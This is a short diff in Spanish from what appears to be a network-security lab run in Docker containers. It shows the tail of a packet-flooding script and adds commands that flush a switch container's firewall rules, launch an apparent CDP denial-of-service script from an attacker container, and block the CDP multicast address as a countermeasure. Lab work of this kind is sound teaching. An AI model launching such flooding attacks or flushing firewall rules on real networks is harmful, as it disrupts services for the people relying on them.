@@ -115,3 +115,12 @@ try:
         time.sleep(0.01)
 except KeyboardInterrupt:
     print(f'\nAtaque detenido. Total: {sent} paquetes enviados con éxito.')
+
+Comando de Limpieza Inicial (Switch - Docker 3)
+docker exec -it docker3 bash -c "iptables -F FORWARD 2>/dev/null; ebtables -F 2>/dev/null; ip link set dev eth1 down && ip link set dev eth1 up && echo '--- ENTORNO LIMPIO ---'"
+Comando para Consultar la Tabla MAC (Switch - Docker 3)
+docker exec -it docker3 bash -c "bridge fdb show dev eth1 | grep -v self"
+Comando para Lanzar el Ataque (Atacante - Docker 1)
+docker exec -it docker1 python3 /tmp/cdp_dos.py
+Comando de Mitigación Definitiva (Switch - Docker 3)
+docker exec -it docker3 bash -c "ebtables -A FORWARD -d 01:00:0c:cc:cc:cc -j DROP; ip link set dev eth1 down && ip link set dev eth1 up && echo 'Contramedida definitiva aplicada'"
